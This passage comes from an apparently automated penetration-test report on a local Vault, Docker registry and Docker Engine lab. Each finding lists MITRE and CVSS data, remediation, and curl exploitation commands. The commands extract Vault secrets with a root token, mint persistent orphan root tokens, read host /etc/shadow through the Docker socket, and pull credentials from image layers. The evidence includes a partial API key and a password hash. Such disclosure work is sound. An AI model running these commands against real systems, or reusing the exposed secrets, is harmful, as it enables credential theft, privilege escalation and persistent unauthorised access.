| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 - Protection of Records` |
| **Endpoint** | `http://127.0.0.1:8200/v1/secret/data/prod/app` |
| **Component** | Vault KV v2 Secrets Engine |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:37:12Z |

#### Description

Using the root token, all secrets were extracted from the KV v2 secrets engine at path secret/. The path secret/data/prod/app contains production credentials: aws_access_key=AKIAFAKE123 and db_password=S3cr3tDB!. These credentials can be used for lateral movement to AWS infrastructure and database systems.

#### Technical Analysis

Full KV v2 secret enumeration and extraction was performed. The path secret/data/prod/app contains AWS access key and database password that could enable lateral movement to cloud and database infrastructure.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" --request LIST http://127.0.0.1:8200/v1/secret/metadata/
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" --request LIST http://127.0.0.1:8200/v1/secret/metadata/prod/
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/secret/data/prod/app
```

#### Evidence / Logs

```
secret/metadata/ → keys: ["prod/"]
secret/metadata/prod/ → keys: ["app"]
secret/data/prod/app → data: {"aws_access_key": "AKIAFAKE123", "db_password": "S3cr3tDB!"}
```

#### Remediation

Rotate all extracted credentials immediately. Implement least-privilege Vault policies. Enable audit logging to detect unauthorized secret access. Use dynamic secrets (database/AWS) instead of static credentials.

---

### 3.10 — Anonymous Push Access to Container Registry — Supply-Chain Image Substitution

| Field | Value |
|-------|-------|
| **ID** | `vuln_143d95` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1195.002` — Supply Chain Compromise: Compromise Software Supply Chain |
| **ISO 27001** | `A.8.25 - Secure Development Life Cycle` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]` |
| **Component** | Docker Registry v2 |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:38:19Z |

#### Description

The OCI registry at 127.0.0.1:5000 allows anonymous push operations. POST /v2/corp/backend/blobs/uploads/ returned HTTP 202 Accepted with a Docker-Upload-Uuid, confirming any unauthenticated attacker can push arbitrary layers and manifests, replacing production tags (e.g., latest) with backdoored images for supply-chain attacks.

#### Technical Analysis

Anonymous push confirmed — any attacker can replace production container images with backdoored versions. This is a direct supply-chain compromise vector.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 -X POST http://127.0.0.1:[REDACTED]
```

#### Evidence / Logs

```
HTTP 202 Accepted
Docker-Upload-Uuid: 5a0cc255-08f2-4a33-8f9c-de3f51bbf5ab
Location: [REDACTED]-08f2-4a33-8f9c-de3f51bbf5ab?state=...
```

#### Remediation

Implement authentication (htpasswd, OAuth2, or LDAP). Restrict push permissions to CI/CD service accounts only. Enable Docker Content Trust for image signing.

---

### 3.11 — Hardcoded PostgreSQL Credentials in Container Image Layer

| Field | Value |
|-------|-------|
| **ID** | `vuln_38e7a6` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:800ea318227d` |
| **Component** | corp/backend:latest image |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:38:32Z |

#### Description

The container image corp/backend:latest contains hardcoded PostgreSQL credentials in /app/.env within layer sha256:800ea318227d. The DSN postgres://admin:S3cr3t@db/prod was extracted anonymously. Anyone with registry read access (which is anonymous) can pull this image and extract production database credentials.

#### Technical Analysis

Production database credentials are permanently baked into the container image layer. Even if deleted in a later layer, they remain in the image history and can be extracted from the original layer blob.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:[REDACTED] -H "Accept: application/vnd.docker.distribution.manifest.v2+json"
curl --connect-timeout 10 -m 30 http://127.0.0.1:[REDACTED]:800ea318227d -o /tmp/layer.tar.gz && tar xzf /tmp/layer.tar.gz -C /tmp/extracted/ && cat /tmp/extracted/app/.env
```

#### Evidence / Logs

```
Extracted /app/.env contents:
db=postgres://admin:S3cr3t@db/prod
AWS_SECRET_ACCESS_KEY=[REDACTED]
```

#### Remediation

Rotate the PostgreSQL credentials immediately. Rebuild the image without secrets. Use Docker build-time secrets (--mount=type=secret) or runtime secrets injection. Never embed credentials in Dockerfiles or image layers.

---

### 3.12 — Hardcoded AWS Secret Access Key in Container Image Layer

| Field | Value |
|-------|-------|
| **ID** | `vuln_bff05a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:800ea318227d` |
| **Component** | corp/backend:latest image |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:38:39Z |

#### Description

The container image corp/backend:latest contains an AWS Secret Access Key ([REDACTED]) in /app/.env within layer sha256:800ea318227d. This key follows AWS credential format and was extracted anonymously from the registry. The practice of embedding any AWS key format in image layers is critical regardless of whether this specific key is active.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:[REDACTED]:800ea318227d -o /tmp/layer.tar.gz && tar xzf /tmp/layer.tar.gz -C /tmp/extracted/ && cat /tmp/extracted/app/.env
```

#### Evidence / Logs

```
AWS_SECRET_ACCESS_KEY=[REDACTED]
```

#### Remediation

Rotate AWS credentials. Use IAM roles or IRSA for container workloads. Never embed AWS keys in container images. Implement image scanning in CI/CD pipelines.

---

### 3.13 — Host /etc/shadow Readable — Password Hash Extraction via Container Escape

| Field | Value |
|-------|-------|
| **ID** | `vuln_8b029a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1003.008` — OS Credential Dumping: /etc/shadow |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `unix:///var/run/docker.sock → /etc/shadow` |
| **Component** | Docker Engine 29.2.0 |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:39:35Z |

#### Description

Full host filesystem access via Docker socket allowed reading /etc/shadow, which contains the yescrypt password hash for user cmehdi. This hash can be cracked offline to obtain the user's plaintext password, enabling direct host login.

#### Exploitation Commands

```bash
curl --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"Image":"alpine:latest","Cmd":["cat","/host/etc/shadow"],"HostConfig":{"Binds":["/:/host:ro"]}}' "http://localhost/containers/create?name=darkmoon-shadow-test"
```

#### Evidence / Logs

```
cmehdi:$y$j9T$qSUHqkMyXjP2gAETO5Kg91$c.[REDACTED]:20504:0:99999:7:::
```

#### Remediation

Restrict Docker socket access. Disable password authentication; use SSH keys only. Implement rootless Docker. Use AppArmor/SELinux to restrict container capabilities.

---

### 3.14 — Root-Level Orphan Token Created via Token Auth — Persistence Demonstrated

| Field | Value |
|-------|-------|
| **ID** | `vuln_afe2f2` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1136.003` — Create Account: Cloud Account |
| **ISO 27001** | `A.9.2.2` |
| **Endpoint** | `http://127.0.0.1:8200/v1/auth/token/create-orphan` |
| **Component** | Vault Token Auth Backend |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:34:11Z |

#### Description

Using the root token, a new orphan token with root policy was minted via auth/token/create-orphan. The orphan token (hvs.[REDACTED_VAULT_TOKEN]) has: policies=["root"], orphan=true, renewable=true, TTL=600s. Being an orphan, this token cannot be revoked by revoking a parent token — it provides independent root-level persistence. An attacker can create unlimited orphan tokens with any policy set, providing persistence and making revocation difficult since each orphan must be individually identified and revoked. The token is also renewable, allowing indefinite extension of access.

#### Technical Analysis

A new root-level orphan token was successfully created using the compromised root token. The minted token (hvs.[REDACTED_VAULT_TOKEN]) has the root policy attached, granting full administrative access to the entire Vault. Being orphan, it cannot be killed by revoking a parent token tree — each orphan token must be individually discovered and revoked. The token is also renewable, meaning an attacker can repeatedly extend it beyond its initial 10-minute TTL to maintain indefinite access. This demonstrates an attacker's ability to create persistent, hard-to-detect backdoor access to the Vault.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" -X POST -d '{"policies":["root"],"ttl":"10m","no_parent":true}' http://127.0.0.1:8200/v1/auth/token/create-orphan | jq .
```

#### Raw Request

```http
POST /v1/auth/token/create-orphan HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root\nContent-Type: application/json\n\n{"policies":["root"],"ttl":"10m","no_parent":true}
```

#### Raw Response

```http
{"request_id":"d6f384ac-1c7a-2617-60ce-ae927f1d2be0","auth":{"client_token":"hvs.[REDACTED_VAULT_TOKEN]","accessor":"rzysMTkKJRMpCplEBUNJub0g","policies":["root"],"token_policies":["root"],"metadata":null,"lease_duration":600,"renewable":true,"entity_id":"","token_type":"service","orphan":true,"mfa_requirement":null,"num_uses":0},"mount_type":"token"}
```

#### Evidence / Logs

```
POST auth/token/create-orphan returned: auth.client_token=hvs.[REDACTED_VAULT_TOKEN], accessor=rzysMTkKJRMpCplEBUNJub0g, policies=["root"], orphan=true, renewable=true, lease_duration=600
```

#### Remediation

1. Revoke the root token immediately. 2. List and revoke all orphan tokens via auth/token/accessors + lookup-accessor. 3. Implement Sentinel policies (Enterprise) to restrict orphan token creation. 4. Use short-TTL tokens with non-renewable policies for service accounts. 5. Restrict auth/token/create-orphan to a minimal set of administrators. 6. Enable audit logging to detect token creation events.

---

### 3.15 — Root-Level Orphan Token Created — Persistent Backdoor Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_7cd283` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1098` — Account Manipulation |
| **ISO 27001** | `A.8.2 - Privileged Access Rights` |
| **Endpoint** | `http://127.0.0.1:8200/v1/auth/token/create-orphan` |
| **Component** | Vault Token Auth Method |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:37:24Z |

#### Description

Using the root token, an orphan token with root policy was minted (hvs.[REDACTED_VAULT_TOKEN]). This token is orphan (not revoked when parent is revoked), renewable, and was verified to successfully read the same secrets. This demonstrates the ability to establish persistent backdoor access that survives root token rotation.

#### Technical Analysis

An attacker with root token access can create orphan tokens that persist even after the original root token is revoked. This provides a persistence mechanism that is difficult to detect without proper audit logging (which is disabled).

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" -X POST -d '{"policies":["root"],"ttl":"600s","renewable":true}' http://127.0.0.1:8200/v1/auth/token/create-orphan
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: hvs.[REDACTED_VAULT_TOKEN]" http://127.0.0.1:8200/v1/secret/data/prod/app
```

#### Evidence / Logs

```
Orphan root token created: hvs.[REDACTED_VAULT_TOKEN]
TTL: 600s, renewable: true, policies: [root]
Verified: orphan token successfully reads secret/data/prod/app
```

#### Remediation

Enable audit logging immediately. Regularly audit token accessors and revoke unauthorized tokens. Implement token usage limits and shorter TTLs. Monitor for orphan token creation events.

---

### 3.16 — Vault Dev Root Token Exposed in Container Environment Variables

| Field | Value |
|-------|-------|
| **ID** | `vuln_db4307` |
| **Severity** | HIGH |
| **CVSS Score** | 8.6 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `unix:///var/run/docker.sock → /dm-vault container env` |
| **Component** | dm-vault container |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:40:15Z |

#### Description

The dm-vault container exposes the root token (VAULT_DEV_ROOT_TOKEN_ID=root) and listen address (0.0.0.0:8200) as environment variables. Combined with host networking, Vault port 8200 is directly accessible on the host. Anyone with Docker API access can read these env vars and gain full Vault admin access.

#### Exploitation Commands

```bash
curl --unix-socket /var/run/docker.sock http:[REDACTED]
```

#### Evidence / Logs

```
Container: /dm-vault
Env: VAULT_DEV_ROOT_TOKEN_ID=root, VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200
NetworkMode: host, CapAdd: [CAP_IPC_LOCK]
```

#### Remediation

Never run Vault in dev mode in production. Use proper unsealing with key shares. Store Vault configuration in secure, non-environment-variable locations.

---

### 3.17 — API Keys Exposed in Container Environment Variables (Anthropic/OpenRouter)

| Field | Value |
|-------|-------|
| **ID** | `vuln_2f0f81` |
| **Severity** | HIGH |
| **CVSS Score** | 8.2 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.17 - Authentication Information` |
| **Endpoint** | `unix:///var/run/docker.sock → /opencode container env` |
| **Component** | opencode container |
| **Discovered by** | `docker` |
| **Discovered at** | 2026-08-01T19:39:57Z |

#### Description

The /opencode container exposes a live Anthropic API key (sk-ant-api03-...) as the OPENROUTER_API_KEY environment variable. This key provides access to LLM inference services and could be used for unauthorized API consumption or model-based attacks. Accessible to anyone with Docker API access.

#### Exploitation Commands

```bash
curl --unix-socket /var/run/docker.sock http:[REDACTED]
```

#### Evidence / Logs

```
Container: /opencode (2f1899f40ab5)
Env: OPENROUTER_API_KEY=sk-ant-api03-[REDACTED]_gH-TKz3jeZJFgxAClqQ1-Lds3DnDGBj6h9iEZ4wUEot1aKkIXEQ-pTZxRAAA
```

#### Remediation

Use Docker secrets or HashiCorp Vault for API keys. Never pass secrets as plain environment variables. Rotate the exposed API key immediately.

---

### 3.18 — Unauthenticated Docker Registry — Full Anonymous Read Access to All Repositories

| Field | Value |
|-------|-------|
| **ID** | `vuln_74d70d` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.9.4.1 Information access restriction` |
| **Endpoint** | `http://127.0.0.1:5000/v2/_catalog` |
| **Component** | Docker Distribution Registry v2 |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:33:30Z |

#### Description

The Docker Registry v2 at 127.0.0.1:5000 allows fully anonymous access without any authentication. The /v2/ endpoint returns HTTP 200 with no WWW-Authenticate challenge, and the /v2/_catalog endpoint reveals all repositories. Any network-reachable client can enumerate all repositories, list all tags, pull all manifests, download all config blobs and image layers. This exposes the entire container image supply chain to unauthenticated access, enabling secret extraction from image layers and build history inspection.

#### Technical Analysis

The Docker Registry v2 API at /v2/ responded with HTTP 200 and no WWW-Authenticate header, confirming zero authentication is required. The /v2/_catalog endpoint returned the full list of repositories (corp/backend). Tags for each repository were enumerable via /v2/{repo}/tags/list. This means any unauthenticated client on the network can discover and pull every image in the registry, including private/internal images.

#### Exploitation Commands

```bash
curl -s -i http://127.0.0.1:5000/v2/
curl -s http://127.0.0.1:5000/v2/_catalog
curl -s http://127.0.0.1:5000/v2/corp/backend/tags/list
```

#### Raw Request

```http
GET /v2/ HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
HTTP/1.1 200 OK
Content-Length: 2
Content-Type: application/json; charset=utf-8
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff

{}
```

#### Evidence / Logs

```
HTTP/1.1 200 OK — /v2/ returns 200 with no auth challenge
{"repositories":["corp/backend"]} — full catalog exposed anonymously
{"name":"corp/backend","tags":["latest"]} — all tags enumerable
```

#### Remediation

Enable authentication on the registry. Configure TLS and require Basic or Bearer token authentication for all API endpoints. Use a reverse proxy (nginx, Traefik) with authentication, or deploy a registry with built-in auth (Harbor, Artifactory). Apply network segmentation to restrict registry access to authorized CI/CD systems and developers only.

---

### 3.19 — No Audit Devices Enabled — All Vault Operations Unlogged

| Field | Value |
|-------|-------|
| **ID** | `vuln_62773c` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `missing_security_control` |
| **MITRE ATT&CK** | `T1562.002` — Impair Defenses: Disable Cloud Logs |
| **ISO 27001** | `A.12.4.1` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/audit` |
| **Component** | Vault Audit System |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:33:51Z |

#### Description

The Vault instance has zero audit devices enabled. The sys/audit endpoint returned an empty data object (data: {}). Without audit logging, all secret accesses, token creations, policy modifications, and administrative actions are completely invisible. An attacker who gains access to this Vault (as demonstrated with the root token) can read, modify, or exfiltrate every secret without leaving any forensic trace. Vault audit devices are the primary mechanism for detecting unauthorized access and meeting compliance requirements.

#### Technical Analysis

The Vault instance has no audit devices configured. The sys/audit API returned an empty data object, confirming that no file, syslog, or socket audit backends are enabled. This means all operations performed against Vault — including secret reads, token creation, policy changes, and system configuration modifications — are not logged anywhere. This creates a complete blind spot for security monitoring, incident response, and compliance auditing. Combined with the trivially guessable root token, an attacker can exfiltrate all secrets with zero forensic evidence.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/sys/audit | jq .
```

#### Raw Request

```http
GET /v1/sys/audit HTTP/1.1\nHost: 127.0.0.1:8200\nX-Vault-Token: root
```

#### Raw Response

```http
{"request_id":"3ea5455e-d914-9012-dee7-c2328d4e3f34","lease_id":"","renewable":false,"lease_duration":0,"data":{},"wrap_info":null,"warnings":null,"auth":null,"mount_type":"system"}
```

#### Evidence / Logs

```
GET sys/audit returned: {"request_id":"3ea5455e-d914-9012-dee7-c2328d4e3f34","data":{}}\nNo audit devices configured - all operations are unlogged.
```

#### Remediation

1. Enable at least one audit device immediately: vault audit enable file file_path=/var/log/vault/audit.log. 2. Configure audit log rotation and retention. 3. Forward audit logs to a SIEM (Splunk, ELK, etc.) for real-time monitoring. 4. Enable at least two audit devices for redundancy (Vault blocks operations when all audit devices fail). 5. Implement alerting on high-risk operations (root token usage, policy changes, secret engine mounts).

---

### 3.20 — Shamir Seal with Single Key Share (Threshold 1/1) — No Split Knowledge

| Field | Value |
|-------|-------|
| **ID** | `vuln_80f717` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `insecure_configuration` |
| **MITRE ATT&CK** | `T1588.004` — Obtain Capabilities: Digital Certificates |
| **ISO 27001** | `A.10.1.1` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/seal-status` |
| **Component** | Vault Seal Configuration |
| **Discovered by** | `vault` |
| **Discovered at** | 2026-08-01T19:34:49Z |

#### Description

The Vault seal configuration uses Shamir's Secret Sharing with only 1 key share and a threshold of 1 (t=1, n=1). This means a single unseal key can unseal the vault — there is no split-knowledge protection. The sys/seal-status endpoint confirms: type=shamir, t=1, n=1. In production, the seal should require multiple key holders (e.g., 3-of-5 or 5-of-7) to prevent any single individual from unsealing the vault. The root token generation also requires only 1 key share (sys/generate-root/attempt shows required=1), meaning any holder of the single unseal key can also generate new root tokens.

#### Technical Analysis

The Vault's seal configuration uses a minimal Shamir scheme with threshold=1 and shares=1. This eliminates the split-knowledge security property that Shamir's Secret Sharing is designed to provide. A single unseal key holder can unseal the vault unilaterally, and the generate-root/attempt endpoint confirms that only 1 key share is needed to generate a new root token. This is a dev-mode configuration that should never be used in production. In a compromise scenario, obtaining the single unseal key grants the attacker permanent, irrevocable control over the Vault since they can re-seal and re-unseal at will, and generate new root tokens.

#### Exploitation Commands

```bash
curl -s --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/seal-status | jq .\ncurl -s --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/sys/generate-root/attempt | jq .
```

#### Raw Request

```http
GET /v1/sys/seal-status HTTP/1.1\nHost: 127.0.0.1:8200
```

#### Raw Response

```http
{"type":"shamir","initialized":true,"sealed":false,"t":1,"n":1,"progress":0,"nonce":"","version":"2.0.3","build_date":"2026-06-17T12:39:45Z","migration":false,"cluster_name":"vault-cluster-78ea103f","cluster_id":"87984de1-9662-10bf-27dc-5fb2d3e1b41b","recovery_seal":false,"storage_type":"inmem"}
```

#### Evidence / Logs

```
sys/seal-status: type=shamir, t=1, n=1, sealed=false\nsys/generate-root/attempt: required=1, started=false
```

#### Remediation

1. Re-initialize Vault with a proper Shamir configuration: vault operator init -key-shares=5 -key-threshold=3. 2. Distribute unseal keys to separate custodians using PGP encryption. 3. Consider using auto-unseal with a cloud KMS (AWS KMS, Azure Key Vault, GCP Cloud KMS) for automated but secure unsealing. 4. Never use threshold=1 in production environments.

---

### 3.21 — Secrets Permanently Visible in Image Config Build History

| Field | Value |
|-------|-------|
| **ID** | `vuln_f4532f` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `information_disclosure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.2 Secure log-on procedures` |
| **Endpoint** | `http://127.0.0.1:[REDACTED]:69553fa838ed526b45a...` |
| **Component** | OCI Image Config Build History |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:35:14Z |

#### Description

The image config blob for corp/backend:latest contains the complete Dockerfile build history in its .history array. The third history entry reveals the full RUN command that creates /app/.env with hardcoded secrets: 'RUN /bin/sh -c mkdir -p /app && echo "AWS_SECRET_ACCESS_KEY=[REDACTED]" > /app/.env && echo "db=postgres://admin:S3cr3t@db/prod" >> /app/.env'. This is a distinct attack vector from the layer extraction because even if layers are squashed or the .env file is deleted in a subsequent layer, the build history permanently retains the secret values in the config blob. The config blob is accessible to any anonymous user via the /v2/{repo}/blobs/{config-digest} endpoint.

#### Technical Analysis

The OCI image config blob is a JSON document that includes a .history array recording every Dockerfile instruction used to build the image. Even if a subsequent layer deletes /app/.env, the build history permanently preserves the exact RUN command including the secret values. This config blob (sha256:69553fa838ed) is referenced by the manifest and downloadable by any user with pull access (anonymous in this case). This demonstrates that multi-stage builds or layer squashing alone cannot remediate secrets that appear in RUN instructions — the build history metadata must also be addressed.

#### Exploitation Commands

```bash
curl -s http://127.0.0.1:[REDACTED]:69553fa838ed526b45a390e3102e171a6b66690447028abd346df0f80500639a | jq '.history[].created_by'
```

#### Raw Request

```http
GET /v2/corp/backend/blobs/sha256:69553fa838ed526b45a390e3102e171a6b66690447028abd346df0f80500639a HTTP/1.1
Host: 127.0.0.1:5000
```

#### Raw Response

```http
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["sh"],"WorkingDir":"/","ArgsEscaped":true},"created":"2026-08-01T17:00:39.572612297Z","history":[{"created":"2025-10-08T11:10:40Z","created_by":"ADD alpine-minirootfs-3.19.9-x86_64.tar.gz / # buildkit"},{"created":"2025-10-08T11:10:40Z","created_by":"CMD [\"/bin/sh\"]","empty_layer":true},{"created":"2026-08-01T17:00:39.572612297Z","created_by":"RUN /bin/sh -c mkdir -p /app && echo \"AWS_SECRET_ACCESS_KEY=[REDACTED]\" > /app/.env && echo \"db=postgres://adm
```

#### Evidence / Logs

```
History entry [2]: "RUN /bin/sh -c mkdir -p /app && echo \"AWS_SECRET_ACCESS_KEY=[REDACTED]\" > /app/.env && echo \"db=postgres://admin:S3cr3t@db/prod\" >> /app/.env # buildkit"
Both credentials visible in plaintext in the build history metadata.
```

#### Remediation

1. Never embed secrets in Dockerfile RUN commands — use Docker BuildKit secrets (--mount=type=secret) which are excluded from the final image and its history. 2. Use multi-stage builds where secrets are only available in the builder stage and never copied to the final image. 3. Inject secrets at runtime via environment variables, Kubernetes Secrets, or a secrets manager. 4. Rebuild this image from scratch without any secret references in the Dockerfile. 5. Delete the old image manifest/tags from the registry to remove the leaked history.

---

### 3.22 — No Audit Devices Enabled — All Operations Invisible

| Field | Value |
|-------|-------|
| **ID** | `vuln_f86f43` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1562.002` — Impair Defenses: Disable Logging |
| **ISO 27001** | `A.8.15 - Logging` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/audit` |
| **Component** | Vault Audit System |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:37:32Z |

#### Description

Vault has no audit devices enabled (sys/audit returns empty {}). All operations including secret reads, token creation, policy changes, and authentication events are completely invisible. An attacker can enumerate, extract, and modify secrets with no forensic trail.

#### Technical Analysis

Without audit logging, there is no way to detect or investigate unauthorized access to Vault secrets. The entire pentest (secret extraction, token creation) left no trace.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 -H "X-Vault-Token: root" http://127.0.0.1:8200/v1/sys/audit
```

#### Evidence / Logs

```
sys/audit response: {"data":{}}
```

#### Remediation

Enable at least one audit device (file or syslog). Configure log forwarding to a SIEM. Enable HMAC hashing for sensitive values in audit logs.

---

### 3.23 — Shamir Seal with Single Key Share (1/1) — No Split-Knowledge Protection

| Field | Value |
|-------|-------|
| **ID** | `vuln_3242cc` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1552` — Unsecured Credentials |
| **ISO 27001** | `A.5.10 - Acceptable Use of Information` |
| **Endpoint** | `http://127.0.0.1:8200/v1/sys/seal-status` |
| **Component** | Vault Seal Configuration |
| **Discovered by** | `hashicorp-vault` |
| **Discovered at** | 2026-08-01T19:37:49Z |

#### Description

Vault seal is configured with 1 key share and threshold of 1. A single person holds all unseal power with no split-knowledge protection. Anyone with this single key can unseal the vault and generate root tokens.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:8200/v1/sys/seal-status
```

#### Evidence / Logs

```
seal-status: type=shamir, shares=1, threshold=1, sealed=false
```

#### Remediation

Re-initialize Vault with at least 5 key shares and a threshold of 3. Distribute key shares to different trusted individuals. Consider using auto-unseal with a KMS.

---

### 3.24 — Unauthenticated Container Registry — Full Anonymous Read Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_c4d2b9` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.3 - Information Access Restriction` |
| **Endpoint** | `http://127.0.0.1:5000/v2/_catalog` |
| **Component** | Docker Registry v2 |
| **Discovered by** | `container-registry` |
| **Discovered at** | 2026-08-01T19:38:47Z |

#### Description

The Docker Registry v2 at 127.0.0.1:5000 requires no authentication for any operation. /v2/ returns HTTP 200 with no WWW-Authenticate challenge, /v2/_catalog returns the full repository listing, and all manifests, configs, and layer blobs are downloadable anonymously.

#### Exploitation Commands

```bash
curl --connect-timeout 10 -m 30 http://127.0.0.1:5000/v2/
curl --connect-timeout 10 -m 30 http://127.0.0.1:5000/v2/_catalog
curl --connect-timeout 10 -m 30 http://127.0.0.1:5000/v2/corp/backend/tags/list
```

#### Evidence / Logs

```
/v2/ → HTTP 200 (no auth challenge)
/v2/_catalog → {"repositories":["corp/backend"]}
/v2/corp/backend/tags/list → {"name":"corp/backend","tags":["latest"]}
```

#### Remediation

Enable authentication (htpasswd, token-based, or LDAP). Implement authorization for read/write operations separately. Restrict network access.

---

